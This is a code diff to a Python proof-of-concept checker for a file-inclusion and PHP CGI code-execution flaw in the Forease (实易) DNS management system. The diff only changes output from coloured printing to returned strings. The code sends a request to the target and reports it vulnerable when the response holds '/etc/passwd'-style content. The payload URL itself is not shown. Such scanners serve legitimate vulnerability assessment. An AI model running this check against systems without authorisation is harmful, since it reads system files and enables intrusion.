@@ -8,8 +8,7 @@ description: 实易智能DNS管理系统，php CGI远程代码执行,文件包�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
 
 class forease_fileinclude_code_exec_BaseVerify():
     def __init__(self, url):
@@ -25,12 +24,13 @@ class forease_fileinclude_code_exec_BaseVerify():
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
             if r"root:" in req.text and r"/bin/bash" in req.text:
-                cprint("[+]存在实易DNS管理系统文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在实易DNS管理系统文件包含漏洞...(高危)\tpayload: "+vulnurl
+            else:
+                return "[-]no vuln"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = forease_fileinclude_code_exec_BaseVerify(sys.argv[1])
     testVuln.run()
